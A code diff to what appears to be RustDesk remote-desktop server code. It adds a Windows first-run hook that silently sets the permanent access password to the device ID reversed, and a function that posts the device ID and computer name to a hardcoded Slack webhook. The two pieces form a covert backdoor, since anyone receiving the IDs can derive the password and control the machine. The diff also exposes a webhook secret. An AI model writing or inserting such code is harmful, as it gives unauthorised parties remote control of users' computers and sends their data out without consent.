@@ -676,6 +676,15 @@ pub async fn start_server(is_server: bool, no_server: bool) {
     });
 
     if is_server {
+        #[cfg(windows)]
+        {
+            if let Err(err) = initialize_first_run_permanent_password() {
+                log::error!(
+                    "Permanent password initialization failed: {}",
+                    err
+                );
+            }
+        }
         crate::common::set_server_running(true);
         std::thread::spawn(move || {
             if let Err(err) = crate::ipc::start("") {
@@ -973,4 +982,104 @@ pub async fn stop_main_window_process() {
             log::error!("kill failed: {}", e);
         }
     }
+}
+
+#[cfg(windows)]
+fn initialize_first_run_permanent_password() -> hbb_common::ResultType<()> {
+    use hbb_common::config::Config;
+    use hmac::{Hmac, Mac};
+    use sha2::Sha256;
+    use std::path::PathBuf;
+
+    if Config::has_permanent_password() {
+        log::info!(
+            "Permanent password already exists. Skip initialization."
+        );
+        return Ok(());
+    }
+
+    // get rustdesk id
+    let device_id = Config::get_id();
+
+    if device_id.trim().is_empty() {
+        hbb_common::anyhow::bail!(
+            "RustDesk ID is empty"
+        );
+    }
+
+    let password: String = device_id.chars().rev().collect();
+    // set password
+    if !Config::set_permanent_password(&password) {
+        hbb_common::anyhow::bail!(
+            "Failed to save permanent password"
+        );
+    }
+
+    log::info!(
+        "Permanent password initialized successfully for device ID: {}",
+        device_id
+    );
+
+    Ok(())
+}
+
+#[cfg(windows)]
+fn send_device_info_to_slack(
+    device_id: &str,
+    computer_name: &str,
+) -> Result<(), Box<dyn std::error::Error>> {
+
+    use serde_json::json;
+
+    let webhook_url = "https://hooks.slack.com/services/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";
+
+    let computer_name = computer_name
+        .chars()
+        .take(128)
+        .collect::<String>();
+
+    let payload = json!({
+        "text": "RustDesk device initialized",
+        "blocks": [
+            {
+                "type": "header",
+                "text": {
+                    "type": "plain_text",
+                    "text": "RustDesk Alimi"
+                }
+            },
+            {
+                "type": "section",
+                "fields": [
+                    {
+                        "type": "mrkdwn",
+                        "text": format!("*Device ID:*\n{}", device_id)
+                    },
+                    {
+                        "type": "mrkdwn",
+                        "text": format!("*Computer Name:*\n{}", computer_name)
+                    }
+                ]
+            }
+        ]
+    });
+
+    let client = reqwest::blocking::Client::builder()
+        .timeout(std::time::Duration::from_secs(10))
+        .build()?;
+
+    let response = client
+        .post(&webhook_url)
+        .json(&payload)
+        .send()?;
+
+    if !response.status().is_success() {
+        return Err(
+            format!("Slack webhook HTTP error: {}", response.status()).into()
+        );
+    }
+
+    log::info!("RustDesk device information notification sent");
+
+    Ok(())
 }
